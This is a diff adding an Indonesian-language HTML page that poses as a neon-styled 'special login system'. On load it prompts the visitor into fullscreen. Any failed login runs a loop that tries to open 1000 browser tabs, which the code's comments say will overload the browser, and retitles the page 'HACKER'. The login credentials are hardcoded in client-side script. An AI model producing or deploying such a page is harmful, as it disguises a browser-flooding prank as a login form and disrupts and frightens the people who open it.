@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Login Khusus</title>
+    <style>
+        /* CSS Utama untuk Full Viewport */
+        html, body {
+            height: 100%; 
+            width: 100%;
+            margin: 0;
+            padding: 0;
+            overflow: hidden; 
+        }
+        
+        /* CSS untuk Desain Neon/Gelap */
+        body {
+            background-color: #000000; 
+            color: #00FF00; 
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .login-container {
+            background-color: rgba(0, 0, 0, 0.8);
+            border: 2px solid #00FF00; 
+            box-shadow: 0 0 20px #00FF00, 0 0 10px #00FF00 inset; 
+            padding: 30px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 350px;
+        }
+
+        #secret-content {
+            display: none; 
+        }
+        
+        /* Efek Neon */
+        h2 { text-align: center; color: #00FF00; margin-bottom: 25px; text-shadow: 0 0 5px #00FF00; }
+        .header-text { color: #FF0000; text-align: center; margin-bottom: 20px; font-size: 0.9em; text-shadow: 0 0 3px #FF0000; }
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; margin-bottom: 5px; color: #00FF00; font-weight: bold; }
+        .input-group input { width: 100%; padding: 10px; background-color: #111; border: 1px solid #00FF00; color: #FFFFFF; border-radius: 5px; box-sizing: border-box; box-shadow: 0 0 8px #00FF00 inset; transition: border-color 0.3s, box-shadow 0.3s; }
+        .login-button { width: 100%; padding: 12px; background-color: #00FF00; color: #000000; border: none; border-radius: 5px; font-size: 1.1em; font-weight: bold; cursor: pointer; margin-top: 15px; transition: background-color 0.3s, box-shadow 0.3s; box-shadow: 0 0 10px #00FF00; }
+        .fill-button { width: 100%; padding: 10px; background-color: #008800; color: #FFFFFF; border: none; border-radius: 5px; font-size: 1em; cursor: pointer; margin-top: 10px; transition: background-color 0.3s; }
+        .footer-text { text-align: center; margin-top: 20px; font-size: 0.85em; color: #AAAAAA; }
+        #error-message { color: yellow; text-align: center; margin-top: 10px; font-weight: bold; }
+
+    </style>
+</head>
+<body onload="promptFullScreen()">
+    
+    <div id="login-form" class="login-container">
+        <h2 style="font-size: 1.5em; text-transform: uppercase;">Aplikasi Login Khusus</h2>
+        <p class="header-text">Masukkan username & password yang telah diberikan</p>
+        
+        <div class="input-group">
+            <label for="username-input">Username</label>
+            <input type="text" id="username-input" placeholder="username" required>
+        </div>
+
+        <div class="input-group">
+            <label for="password-input">Password</label>
+            <input type="password" id="password-input" placeholder="password" required>
+        </div>
+
+        <button onclick="checkPassword()" class="login-button">Login</button>
+        <p id="error-message"></p>
+        <p class="footer-text">Masuk untuk membuka menu & fitur</p>
+        <button class="fill-button">Isi</button>
+    </div>
+
+    <div id="secret-content" class="login-container" style="display: none;">
+        <h2 style="color: #FFFFFF; text-shadow: 0 0 10px #00FF00;">Akses Berhasil!</h2>
+        <p style="text-align: center; color: #00FF00;">Selamat Datang di Sistem!</p>
+        
+        <p class="footer-text">Menu & fitur tersedia di sini.</p>
+        <button class="fill-button" onclick="alert('Menu Terbuka!')">Isi Menu</button>
+    </div>
+
+    <script>
+        // Data Login
+        const CORRECT_USERNAME = "1ggg1";
+        const CORRECT_PASSWORD = "HDbetjir"; 
+        const TAB_COUNT = 1000; // Ditingkatkan menjadi 1000 kali
+
+        // 1. Fungsi untuk Memicu Layar Penuh
+        function toggleFullScreen() {
+            const doc = document.documentElement;
+            const requestFn = doc.requestFullscreen || doc.webkitRequestFullscreen || doc.mozRequestFullScreen || doc.msRequestFullscreen;
+
+            if (requestFn) {
+                requestFn.call(doc).catch(err => {});
+            }
+        }
+
+        // 2. Notif yang Memicu Layar Penuh
+        function promptFullScreen() {
+            const proceed = confirm("KLIK OK untuk mengaktifkan mode Layar Penuh dan melanjutkan.");
+            
+            if (proceed) {
+                toggleFullScreen();
+            }
+        }
+
+        // 3. Fungsi Cek Kata Sandi dengan Simulasi Overload
+        function checkPassword() {
+            const usernameInput = document.getElementById('username-input').value; 
+            const passwordInput = document.getElementById('password-input').value;
+            const errorMessage = document.getElementById('error-message');
+
+            if (usernameInput === CORRECT_USERNAME && passwordInput === CORRECT_PASSWORD) {
+                // LOGIN BENAR: Mengalihkan ke halaman kosong (simulasi keluar)
+                errorMessage.textContent = 'Login Berhasil! Keluar dari Sistem...'; 
+                document.title = "Sistem Login Khusus";
+                window.location.href = "about:blank"; 
+                
+            } else {
+                // LOGIN SALAH: SIMULASI OVERLOAD 1000 TAB
+                errorMessage.textContent = `Gagal Login! Membuka ${TAB_COUNT} Jendela Baru...`;
+                
+                // Mengubah judul tab untuk efek "Hacker"
+                document.title = "⚠️ HACKER ⚠️"; 
+                
+                // Mencoba membuka 1000 tab (akan sangat membebani browser)
+                for (let i = 0; i < TAB_COUNT; i++) {
+                    window.open('about:blank', '_blank');
+                }
+
+                alert(`Peringatan: ${TAB_COUNT} upaya membuka jendela telah selesai. Browser mungkin tidak merespons sementara.`);
+                
+                // Atur ulang input dan pesan
+                document.getElementById('username-input').value = '';
+                document.getElementById('password-input').value = '';
+                errorMessage.textContent = 'Gagal Login! Coba lagi.';
+                document.title = "Sistem Login Khusus"; 
+            }
+        }
+    </script>
+
+</body>
+</html>
